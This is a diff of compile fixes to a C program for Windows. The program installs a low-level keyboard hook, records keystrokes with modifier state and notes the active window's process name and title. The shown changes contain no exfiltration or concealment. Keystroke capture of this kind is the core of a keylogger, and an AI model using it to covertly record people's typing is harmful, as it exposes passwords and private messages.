@@ -13,7 +13,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
             DWORD flags = 0;
-            if (kbdStruct->flags & LLKF_EXTENDED) flags |= 0x100;
+            if (kbdStruct->flags & LLKHF_EXTENDED) flags |= 0x100;
             if (GetAsyncKeyState(VK_CONTROL) & 0x8000) flags |= 0x200;
             if (GetAsyncKeyState(VK_MENU) & 0x8000) flags |= 0x400;
             if (GetAsyncKeyState(VK_SHIFT) & 0x8000) flags |= 0x800;
@@ -73,7 +73,7 @@ void get_active_window_info(char* appName, size_t appNameSize, char* windowTitle
                 // Lấy tên file từ đường dẫn
                 char* fileName = strrchr(processPath, '\\');
                 if (fileName) {
-                    fileName++; // Bỏ qua dấu \
+                    fileName++; // Bỏ qua dấu backslash
                 } else {
                     fileName = processPath;
                 }
@@ -162,10 +162,10 @@ const char* vkey_to_string(WPARAM vkey, DWORD flags) {
                     char charStr[2] = {ch, '\0'};
                     strcat(keyString, charStr);
                 } else {
-                    snprintf(keyString + strlen(keyString), sizeof(keyString) - strlen(keyString), "VK%d", vkey);
+                    snprintf(keyString + strlen(keyString), sizeof(keyString) - strlen(keyString), "VK%llu", (unsigned long long)vkey);
                 }
             } else {
-                snprintf(keyString + strlen(keyString), sizeof(keyString) - strlen(keyString), "VK%d", vkey);
+                snprintf(keyString + strlen(keyString), sizeof(keyString) - strlen(keyString), "VK%llu", (unsigned long long)vkey);
             }
             break;
         }
